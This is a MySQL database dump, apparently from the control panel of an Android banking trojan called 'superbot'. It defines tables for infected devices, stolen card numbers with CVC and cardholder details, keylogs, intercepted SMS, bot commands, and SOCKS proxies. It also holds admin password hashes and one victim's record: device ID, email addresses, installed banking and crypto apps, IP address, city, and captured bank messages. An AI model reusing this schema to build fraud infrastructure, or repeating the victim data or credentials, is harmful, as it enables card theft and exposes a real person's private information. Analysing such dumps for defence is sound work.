-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: superbot
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.16.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `admin_accounts`
--

DROP TABLE IF EXISTS `admin_accounts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `admin_accounts` (
  `id` int(25) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(20) NOT NULL,
  `passwd` varchar(50) NOT NULL,
  `admin_type` varchar(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admin_accounts`
--

LOCK TABLES `admin_accounts` WRITE;
/*!40000 ALTER TABLE `admin_accounts` DISABLE KEYS */;
INSERT INTO `admin_accounts` VALUES (1,'DukeEugene','408b90a013538ef357dc4305665b53ab','super'),(2,'users','827ccb0eea8a706c4c34a16891f84e7b','super'),(8,'Admin','e3afed0047b08059d0fada10f400c1e5','super');
/*!40000 ALTER TABLE `admin_accounts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `banks`
--

DROP TABLE IF EXISTS `banks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `banks` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `data` text,
  `time` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `banks`
--

LOCK TABLES `banks` WRITE;
/*!40000 ALTER TABLE `banks` DISABLE KEYS */;
/*!40000 ALTER TABLE `banks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cc_info`
--

DROP TABLE IF EXISTS `cc_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cc_info` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `IMEI` text NOT NULL,
  `CARD` text NOT NULL,
  `typeCard` text,
  `MMYY` text,
  `CVC` text,
  `VBV` text,
  `CardholderName` text,
  `PhoneNumber` text,
  `birth_date` text,
  `zip_code` text,
  `holder_address` text,
  `last_update` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cc_info`
--

LOCK TABLES `cc_info` WRITE;
/*!40000 ALTER TABLE `cc_info` DISABLE KEYS */;
/*!40000 ALTER TABLE `cc_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `clients`
--

DROP TABLE IF EXISTS `clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `clients` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) DEFAULT NULL,
  `version_apk` text,
  `country` varchar(30) DEFAULT NULL,
  `model` text,
  `apps` text,
  `lastConnect` int(11) DEFAULT NULL,
  `firstConnect` int(11) DEFAULT NULL,
  `root` varchar(50) DEFAULT NULL,
  `screen` varchar(50) DEFAULT NULL,
  `comment` text,
  `internet` text,
  `secret` text,
  `ip` text,
  `zip` text,
  `regionName` text,
  `city` text,
  `s_bank` int(11) DEFAULT '0',
  `s_card` int(11) DEFAULT '0',
  `s_sms` int(11) DEFAULT '0',
  `s_log` int(11) DEFAULT '0',
  `s_a7inj_enabled` int(11) DEFAULT '0',
  `s_whitelist` int(11) DEFAULT '0',
  `s_sms_manager` int(11) DEFAULT '0',
  `s_accessibility` int(11) DEFAULT '0',
  `s_overlay` int(11) DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `clients`
--

LOCK TABLES `clients` WRITE;
/*!40000 ALTER TABLE `clients` DISABLE KEYS */;
INSERT INTO `clients` VALUES (1,'6bf39850cbb13fc1','WhatsApp;com.whatsapp e9227333777@gmail.com;com.google bankbotalien@gmail.com;com.google Мой Threema ID;ch.threema.app 568474411;org.telegram.BifToGram 312528865;org.telegram.BifToGram 586241671;org.telegram.BifToGram 574697216;org.telegram.BifToGram 1068118227;org.telegram.BifToGram ','9:Xiaomi Redmi Note 5','001','RU','piuk.blockchain.android; com.Plus500; com.whatsapp; com.android.vending; com.google.android.gm; com.coinbase.android; ',NULL,1586249448,1586248262,'1','1',NULL,'mobile:[North Star]',NULL,'185.176.221.184','LV-2111','Riga','Riga',0,0,1,1,0,1,1,1,1);
/*!40000 ALTER TABLE `clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `commands`
--

DROP TABLE IF EXISTS `commands`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `commands` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL,
  `command_name` text,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `commands`
--

LOCK TABLES `commands` WRITE;
/*!40000 ALTER TABLE `commands` DISABLE KEYS */;
/*!40000 ALTER TABLE `commands` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `contacts`
--

DROP TABLE IF EXISTS `contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `contacts` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `number` varchar(60) DEFAULT NULL,
  `name` varchar(60) DEFAULT NULL,
  `country` varchar(60) DEFAULT NULL,
  `time` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `contacts`
--

LOCK TABLES `contacts` WRITE;
/*!40000 ALTER TABLE `contacts` DISABLE KEYS */;
/*!40000 ALTER TABLE `contacts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `guests`
--

DROP TABLE IF EXISTS `guests`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `guests` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  `filter` text NOT NULL,
  `secret` text NOT NULL,
  `link` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `guests`
--

LOCK TABLES `guests` WRITE;
/*!40000 ALTER TABLE `guests` DISABLE KEYS */;
/*!40000 ALTER TABLE `guests` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `info`
--

DROP TABLE IF EXISTS `info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `info` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `name` varchar(60) DEFAULT NULL,
  `hash` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `info`
--

LOCK TABLES `info` WRITE;
/*!40000 ALTER TABLE `info` DISABLE KEYS */;
/*!40000 ALTER TABLE `info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `keylogs`
--

DROP TABLE IF EXISTS `keylogs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `keylogs` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `keylogs`
--

LOCK TABLES `keylogs` WRITE;
/*!40000 ALTER TABLE `keylogs` DISABLE KEYS */;
INSERT INTO `keylogs` VALUES (1,'6bf39850cbb13fc1',1586248523,'NOTIFICATION\\: Package \\= \\[ com\\.android\\.messaging \\],text \\= \\[ 900\\: Услуга Мобильный Банк не подключена к вашему номеру телефона\\. Данная услуга позволяет быстро и удобно совершать платежи и переводы с помощью мобильного телефона в любое время и в любом месте\\. Подключить можно через любой банкомат, терминал Сбербанка или в ближайшем отделении \\]'),(2,'6bf39850cbb13fc1',1586248872,'NOTIFICATION\\: Package \\= \\[ com\\.android\\.messaging \\],text \\= \\[ 900\\: Услуга Мобильный Банк не подключена к вашему номеру телефона\\. Данная услуга позволяет быстро и удобно совершать платежи и переводы с помощью мобильного телефона в любое время и в любом месте\\. Подключить можно через любой банкомат, терминал Сбербанка или в ближайшем отделении \\]'),(3,'6bf39850cbb13fc1',1586249372,'NOTIFICATION\\: Package \\= \\[ abc\\.apple\\.emoji\\.theme\\.gif\\.keyboard \\],text \\= \\[ ВЫКЛ прогноз\\-е \\]'),(4,'6bf39850cbb13fc1',1586249375,'NOTIFICATION\\: Package \\= \\[ abc\\.apple\\.emoji\\.theme\\.gif\\.keyboard \\],text \\= \\[ ВКЛ прогноз\\-е \\]');
/*!40000 ALTER TABLE `keylogs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `locked_clients`
--

DROP TABLE IF EXISTS `locked_clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `locked_clients` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(300) NOT NULL,
  `version` varchar(100) DEFAULT NULL,
  `country` varchar(30) DEFAULT NULL,
  `client_id` text,
  `secret` text,
  `lastConnect` int(11) DEFAULT NULL,
  `firstConnect` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `locked_clients`
--

LOCK TABLES `locked_clients` WRITE;
/*!40000 ALTER TABLE `locked_clients` DISABLE KEYS */;
/*!40000 ALTER TABLE `locked_clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `logs`
--

DROP TABLE IF EXISTS `logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `logs` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `logs`
--

LOCK TABLES `logs` WRITE;
/*!40000 ALTER TABLE `logs` DISABLE KEYS */;
INSERT INTO `logs` VALUES (1,'6bf39850cbb13fc1',1586248293,'Send SMS'),(2,'6bf39850cbb13fc1',1586248503,'Send SMS'),(3,'6bf39850cbb13fc1',1586248862,'Send SMS');
/*!40000 ALTER TABLE `logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `proxy_servers`
--

DROP TABLE IF EXISTS `proxy_servers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `proxy_servers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` text NOT NULL,
  `user` text NOT NULL,
  `pass` text NOT NULL,
  `forward_user` text NOT NULL,
  `forward_pass` text NOT NULL,
  `root` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `country` text NOT NULL,
  `note` text NOT NULL,
  `status` int(11) NOT NULL,
  `status_text` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `proxy_servers`
--

LOCK TABLES `proxy_servers` WRITE;
/*!40000 ALTER TABLE `proxy_servers` DISABLE KEYS */;
/*!40000 ALTER TABLE `proxy_servers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sms`
--

DROP TABLE IF EXISTS `sms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sms` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sms`
--

LOCK TABLES `sms` WRITE;
/*!40000 ALTER TABLE `sms` DISABLE KEYS */;
INSERT INTO `sms` VALUES (1,'6bf39850cbb13fc1',1586248522,'900\\: Услуга Мобильный Банк не подключена к вашему номеру телефона\\. Данна'),(2,'6bf39850cbb13fc1',1586248522,'900\\: я услуга позволяет быстро и удобно совершать платежи и переводы с п'),(3,'6bf39850cbb13fc1',1586248522,'900\\: омощью мобильного телефона в любое время и в любом месте\\. Подключит'),(4,'6bf39850cbb13fc1',1586248522,'900\\: ь можно через любой банкомат, терминал Сбербанка или в ближайшем от'),(5,'6bf39850cbb13fc1',1586248523,'900\\: делении'),(6,'6bf39850cbb13fc1',1586248872,'900\\: Услуга Мобильный Банк не подключена к вашему номеру телефона\\. Данна'),(7,'6bf39850cbb13fc1',1586248872,'900\\: я услуга позволяет быстро и удобно совершать платежи и переводы с п'),(8,'6bf39850cbb13fc1',1586248872,'900\\: омощью мобильного телефона в любое время и в любом месте\\. Подключит'),(9,'6bf39850cbb13fc1',1586248872,'900\\: ь можно через любой банкомат, терминал Сбербанка или в ближайшем от'),(10,'6bf39850cbb13fc1',1586248872,'900\\: делении');
/*!40000 ALTER TABLE `sms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `socks`
--

DROP TABLE IF EXISTS `socks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `socks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `imei` text NOT NULL,
  `bot_country` text NOT NULL,
  `server` int(11) NOT NULL,
  `port` int(11) NOT NULL,
  `connect_time` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `socks`
--

LOCK TABLES `socks` WRITE;
/*!40000 ALTER TABLE `socks` DISABLE KEYS */;
/*!40000 ALTER TABLE `socks` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-04-07 11:50:58
